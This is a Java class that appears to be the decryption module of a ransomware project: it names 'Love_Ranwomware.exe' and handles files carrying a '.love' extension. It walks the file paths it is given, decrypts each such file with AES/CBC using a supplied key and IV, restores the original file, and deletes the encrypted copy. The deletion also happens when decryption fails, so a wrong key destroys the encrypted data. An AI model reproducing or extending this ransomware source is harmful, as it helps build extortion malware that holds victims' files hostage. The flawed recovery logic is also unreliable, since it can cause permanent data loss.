package com.joke.logic;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map.Entry;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.joke.object.PathAndResult;

public class FileEncryptionDecode {
    
    public List<PathAndResult> getFileEncryptionDecodeResultList(String key, String iv) {
        HashMap<String, List<String>> pathMap = new PathRead().getRootByPathRead();
        List<PathAndResult> resultList = new ArrayList<>();
        PathAndResult pathAndResult = null;

        for (Entry<String, List<String>> pathList : pathMap.entrySet()) {
            for (String path : pathMap.get(pathList.getKey())) {
                pathAndResult = new PathAndResult();
                pathAndResult.setPath(path);
                pathAndResult.setResult(_getFileToString(path, key, iv));

                resultList.add(pathAndResult);
            }
        }

        return resultList;
    }

    private String _getFileToString(String path, String key, String iv) {
        if (path == null) return "Failed";
        if (!path.contains(".love")) return "Failed";
        if (path.contains("Love_Ranwomware.exe")) return "Failed";

        String result = null;

        try {

            File file = new File(path);

            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(file)));

            String line = null, dataInput = null;
            if((line=br.readLine()) != null){
                // System.out.print(line);
                dataInput = line;
            }

            result = _getByteToFile(file.getPath(), _decode(dataInput, key, iv));

            br.close();

            // 원본파일 생성 후 암화파일 삭제
            Files.deleteIfExists(Paths.get(path));
        } catch (Exception e) {
            e.printStackTrace();
            result = "Failed";
        }

        return result;
    }

    private byte[] _decode(String data, String key, String iv) {
        byte[] encryptedData = null;

        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
            IvParameterSpec ivParamSpec = new IvParameterSpec(iv.getBytes());
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivParamSpec);


            try {
                byte[] decodedBytes = Base64.getDecoder().decode(data);
                encryptedData = cipher.doFinal(decodedBytes);
            } catch (Exception e) {
                //TODO: handle exception
                e.printStackTrace();
            }
            // System.out.print(encryptedData);
        } catch (Exception e) {
            //TODO: handle exception
            e.printStackTrace();
        }
        
        return encryptedData;
    }

    private String _getByteToFile(String path, byte[] fileByte) {
        if (!path.contains(".love") || null == fileByte) return "Failed";

        try {
            FileOutputStream fileOutput = new FileOutputStream(new File(path.replace(".love", "")));
            
            fileOutput.write(fileByte, 0, fileByte.length);

            fileOutput.close();

        } catch (Exception e) {
            //TODO: handle exception
            e.printStackTrace();
            return "Failed";
        }

        return "Success";
    }
}
